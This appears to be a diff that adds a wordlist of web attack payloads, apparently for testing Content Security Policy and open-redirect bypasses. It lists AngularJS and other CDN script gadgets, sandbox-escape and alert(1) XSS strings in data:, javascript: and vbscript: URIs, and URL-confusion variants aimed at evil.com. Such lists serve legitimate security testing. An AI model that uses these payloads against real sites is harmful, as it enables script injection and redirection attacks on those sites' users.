@@ -1,0 +1,97 @@
+https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.1.4/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.2.1/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.2.9/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.2.19/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.2.29/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.3.3/angular.js
+https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.4/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.0/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.1/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.27/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.28/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.29/angular.min.js
+https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.3.0/angular.min.js
+data:application/javascript,angular.module('exploit',[]).service('$rootScope',class{constructor(){constructor.constructor('alert(1)')()}})
+data:application/javascript,angular.callbacks._0=function(){alert(1)}
+data:text/javascript,angular.module('exploit',[]).service('$rootScope',class{constructor(){constructor.constructor('alert(1)')()}})
+data:text/javascript,angular.callbacks._0=function(){alert(1)}
+data:,angular.module('exploit',[]).service('$rootScope',class{constructor(){constructor.constructor('alert(1)')()}})
+data:,angular.callbacks._0=function(){alert(1)}
+https://cdn.jsdelivr.net/npm/vue@2.6.12/dist/vue.js
+https://cdn.jsdelivr.net/npm/lodash@4.17.20/lodash.min.js
+https://cdn.jsdelivr.net/npm/react@16.13.1/umd/react.production.min.js
+https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js
+https://cdnjs.cloudflare.com/ajax/libs/react/16.13.1/umd/react.production.min.js
+https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.13.1/umd/react-dom.production.min.js
+https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js
+https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js
+http://code.jquery.com/jquery-1.12.4.min.js
+https://code.jquery.com/jquery-3.5.1.min.js
+https://code.jquery.com/jquery-2.2.4.min.js
+https://code.jquery.com/jquery-1.7.2.min.js
+https://cdnjs.cloudflare.com/ajax/libs/dojo/1.8.7/dojo.js
+https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/js/bootstrap.min.js
+https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js
+https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.11.0/underscore.min.js
+https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone.min.js
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+http://xss.rocks/xss.js
+blob:https://vulnerable-website.com/
+filesystem:https://vulnerable-website.com/
+https://vulnerable-website.com.evil.com/
+https://blocked-website.com%2f@whitelisted-website.com
+https://whitelisted-website.com%40blocked-website.com
+https://google.com%252f%252e%252e%252fblocked-website.com
+http:/\\/google.com
+https:/\\/google.com
+data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyhkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+vbscript:alert(1)
+//google.com/
+google.com/
+//google.com
+google.com
+%2f%2fgoogle.com
+google.com/%2f%2f..
+eval(alert(1))
+Function('alert(1)')()
+document.write('<script>alert(1)</script>')
+document.write('<img src=x onerror=alert(1)>')
+document['write']('<img src=x onerror=alert(1)>')
+this['document']['write']('<img src=x onerror=alert(1)>')
+window['document']['write']('<img src=x onerror=alert(1)>')
+self['document']['write']('<img src=x onerror=alert(1)>')
+top['document']['write']('<img src=x onerror=alert(1)>')
+parent['document']['write']('<img src=x onerror=alert(1)>')
+globalThis['document']['write']('<img src=x onerror=alert(1)>')
+self.document.body.innerHTML = '<img src=x onerror=alert(1)>'
+top.document.body.innerHTML = '<img src=x onerror=alert(1)>'
+parent.document.body.innerHTML = '<img src=x onerror=alert(1)>'
+https://pastebin.com/raw/abcd1234
+https://hastebin.com/raw/abcd1234
+https://jsfiddle.net/user/demo/
+https://jsbin.com/abcd1234
+https://codepen.io/user/pen/abcd1234
+https://repl.it/@user/abcd1234
+https://gist.githubusercontent.com/user/abcd1234/raw/abcd1234
+https://raw.githubusercontent.com/user/repo/branch/path/to/file.js
+https://evil.com/script.js#
+https://evil.com/script.js?
+https://evil.com/script.js/..
+https://accounts.google.com//.evil.com
+https://google.com//evil.com
+https://google.com%2f%2f.evil.com
+https://google.com%5c%5c.evil.com
+https://google.com%3fevil.com
+https://google.com%23evil.com
+https://google.com/.evil.com
+https://google.com\.evil.com
+https://google.com;evil.com
+https://google.com:80;evil.com:80
+https://google.com:80,evil.com:80
